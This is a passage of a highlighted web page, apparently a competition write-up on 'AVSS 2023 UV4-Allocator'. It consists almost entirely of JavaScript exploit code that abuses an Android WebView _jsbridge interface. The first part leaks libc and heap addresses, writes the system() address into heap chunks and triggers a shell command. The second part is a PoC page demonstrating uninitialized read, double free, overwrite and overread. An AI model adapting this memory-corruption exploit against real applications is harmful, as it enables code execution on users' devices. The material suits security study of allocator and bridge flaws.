</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">check_ct </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">hexToLE64</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">content</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((</span><span style="color:#8fa1b3;">Number</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">check_ct</span><span style="color:#c0c5ce;">&gt;&gt;</span><span style="color:#d08770;">32</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">)&amp;</span><span style="color:#d08770;">0xf0</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0x70 </span><span style="color:#c0c5ce;">&amp;&amp; </span><span style="color:#8fa1b3;">Number</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">check_ct</span><span style="color:#c0c5ce;">&amp;</span><span style="color:#d08770;">0xfff</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0xc58</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">control_idx </span><span style="color:#c0c5ce;">+= </span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">libc_base </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">check_ct</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0xa8c58</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">heap_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">hexToLE64</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">content</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">))-</span><span style="color:#d08770;">0x10</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">debug1_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">LEToHex64</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">BigInt</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">))+</span><span style="color:#8fa1b3;">LEToHex64</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">libc_base</span><span style="color:#c0c5ce;">)+</span><span style="color:#8fa1b3;">LEToHex64</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x4343434343434343</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">chunk_ct </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">control_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa08</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">system_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">libc_base</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x60cc4</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">cmd </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">echo hacked &gt; /data/data/com.avss.testallocator/files/tmp/hacked</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">offset </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x98</span><span style="color:#c0c5ce;">&lt;</span><span style="color:#d08770;">0xa00</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">+=</span><span style="color:#d08770;">0x98</span><span style="color:#c0c5ce;">){
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">chunk_ct </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">chunk_ct</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, (</span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">+</span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">)*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        + </span><span style="color:#8fa1b3;">LEToHex64</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">heap_addr</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        + </span><span style="color:#8fa1b3;">LEToHex64</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">system_addr</span><span style="color:#c0c5ce;">) + </span><span style="color:#bf616a;">chunk_ct</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">((</span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">+</span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">)*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">chunk_ct</span><span style="color:#c0c5ce;">.length*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">control_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">chunk_ct</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">control_idx</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">convertToASCII</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">)+&quot;</span><span style="color:#a3be8c;">00</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// debug
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// for(var i = 0; i &lt; 0x1000; i++){
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">//     _jsbridge.edit(debug1_idx, LEToHex64(BigInt(control_idx)));
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">closefile</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">&lt;/</span><span style="color:#bf616a;">script</span><span style="color:#c0c5ce;">&gt;
</span></pre>
<p>poc</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">&lt;</span><span style="color:#bf616a;">html</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">    &lt;</span><span style="color:#bf616a;">head</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    &lt;/</span><span style="color:#bf616a;">head</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">    &lt;</span><span style="color:#bf616a;">body</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        &lt;</span><span style="color:#bf616a;">h1</span><span style="color:#c0c5ce;">&gt;AVSS 2023&lt;/</span><span style="color:#bf616a;">h1</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">        &lt;</span><span style="color:#bf616a;">p</span><span style="color:#c0c5ce;">&gt;UV4-Allocator A8 PoC&lt;/</span><span style="color:#bf616a;">p</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        &lt;</span><span style="color:#bf616a;">script </span><span style="color:#d08770;">type</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">text/javascript</span><span style="color:#c0c5ce;">&quot;  &gt;
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">print_res</span><span style="color:#c0c5ce;">(res) {
</span><span style="color:#c0c5ce;">                document.</span><span style="color:#96b5b4;">write</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">&lt;p&gt;</span><span style="color:#c0c5ce;">&quot; + </span><span style="color:#bf616a;">res </span><span style="color:#c0c5ce;">+ &quot;</span><span style="color:#a3be8c;">&lt;/p&gt;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">bytesToHexString</span><span style="color:#c0c5ce;">(bytes) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return </span><span style="color:#ebcb8b;">Array</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">from</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">bytes</span><span style="color:#c0c5ce;">, byte </span><span style="color:#b48ead;">=&gt; </span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&#39; + (</span><span style="color:#bf616a;">byte </span><span style="color:#c0c5ce;">&amp; </span><span style="color:#d08770;">0xFF</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">)).</span><span style="color:#8fa1b3;">slice</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">)).</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(&#39;&#39;);
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">bytesToString</span><span style="color:#c0c5ce;">(bytes) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return </span><span style="color:#ebcb8b;">String</span><span style="color:#c0c5ce;">.fromCharCode.</span><span style="color:#8fa1b3;">apply</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">null</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">bytes</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">unhex</span><span style="color:#c0c5ce;">(hexString) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">str </span><span style="color:#c0c5ce;">= &#39;&#39;;
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">hexString</span><span style="color:#c0c5ce;">.length; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">+= </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">                    </span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">byte </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">parseInt</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">hexString</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">substr</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">), </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">                    </span><span style="color:#bf616a;">str </span><span style="color:#c0c5ce;">+= </span><span style="color:#ebcb8b;">String</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">fromCharCode</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">byte</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">hex</span><span style="color:#c0c5ce;">(str) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">hex </span><span style="color:#c0c5ce;">= &#39;&#39;;
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">.length; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
</span><span style="color:#c0c5ce;">                    </span><span style="color:#bf616a;">hex </span><span style="color:#c0c5ce;">+= </span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">charCodeAt</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">padStart</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&#39;);
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">hex</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">unpack64</span><span style="color:#c0c5ce;">(data) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return </span><span style="color:#96b5b4;">parseInt</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">match</span><span style="color:#c0c5ce;">(/</span><span style="color:#d08770;">..</span><span style="color:#c0c5ce;">/</span><span style="color:#b48ead;">g</span><span style="color:#c0c5ce;">).</span><span style="color:#96b5b4;">reverse</span><span style="color:#c0c5ce;">().</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(&#39;&#39;), </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">pack64</span><span style="color:#c0c5ce;">(data) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">match</span><span style="color:#c0c5ce;">(/</span><span style="color:#d08770;">..</span><span style="color:#c0c5ce;">/</span><span style="color:#b48ead;">g</span><span style="color:#c0c5ce;">).</span><span style="color:#96b5b4;">reverse</span><span style="color:#c0c5ce;">().</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(&#39;&#39;).</span><span style="color:#8fa1b3;">padEnd</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">&#39;);
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(idx, key, size) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(idx, value) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(idx, size) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">res </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">                console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">res</span><span style="color:#c0c5ce;">+&quot; &quot;);
</span><span style="color:#c0c5ce;">                </span><span style="color:#65737e;">// print_res(res);
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">res</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">jdelete</span><span style="color:#c0c5ce;">(idx) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#bf616a;">_jsbridge</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">            console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Start</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">print_res</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Start</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">// uninitialization
</span><span style="color:#c0c5ce;">            console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">uninitialization</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">a0</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">res </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">print_res</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">res</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">// double free
</span><span style="color:#c0c5ce;">            console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">double free</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">a1</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">jdelete</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">jdelete</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">a2</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">a3</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">deadbeefdeadbeefdeadbeefdeadbeef</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">            console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">a2: </span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">res </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">a3: </span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">res </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">// overwrite
</span><span style="color:#c0c5ce;">            console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">overwrite 8 bytes</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">a4</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">a5</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">before: </span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">res </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">, &quot;&quot;.</span><span style="color:#8fa1b3;">padEnd</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">3</span><span style="color:#c0c5ce;">&quot;))
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">// overread            
</span><span style="color:#c0c5ce;">            console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">after: </span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">res </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">print_res</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">res</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Done</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">print_res</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Done</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            &lt;/</span><span style="color:#bf616a;">script</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">    &lt;/</span><span style="color:#bf616a;">body</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">&lt;/</span><span style="color:#bf616a;">html</span><span style="color:#c0c5ce;">&gt;
</span></pre>
</main>
                <aside class="toc-sidebar">
                    <div class="toc-sticky-container">
                        <div class="toc-header">:: Contents ::</div>
